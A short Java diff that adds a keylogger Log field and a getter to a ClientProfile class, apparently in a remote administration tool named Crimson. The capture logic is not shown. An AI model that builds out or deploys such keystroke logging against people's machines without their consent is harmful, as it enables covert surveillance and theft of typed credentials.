@@ -28,6 +28,7 @@ import javax.swing.ImageIcon;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
 import com.subterranean_security.crimson.core.proto.Delta.NetworkInterface;
 import com.subterranean_security.crimson.core.util.CUtil;
+import com.subterranean_security.crimson.sv.keylogger.Log;
 import com.subterranean_security.crimson.viewer.ui.utility.UUtil;
 
 public class ClientProfile implements Serializable {
@@ -41,6 +42,7 @@ public class ClientProfile implements Serializable {
 	private transient ImageIcon osIcon;
 
 	// General attributes
+	private Log keylog;
 	private Attribute osFamily;
 	private Attribute osName;
 	private Attribute osArch;
@@ -92,6 +94,7 @@ public class ClientProfile implements Serializable {
 	}
 
 	public ClientProfile() {
+		keylog = new Log();
 		osFamily = new UntrackedAttribute();
 		osName = new UntrackedAttribute();
 		osArch = new UntrackedAttribute();
@@ -140,6 +143,10 @@ public class ClientProfile implements Serializable {
 			osIcon.setDescription(osName.get());
 		}
 
+	}
+
+	public Log getKeylog() {
+		return keylog;
 	}
 
 	public String getOsFamily() {
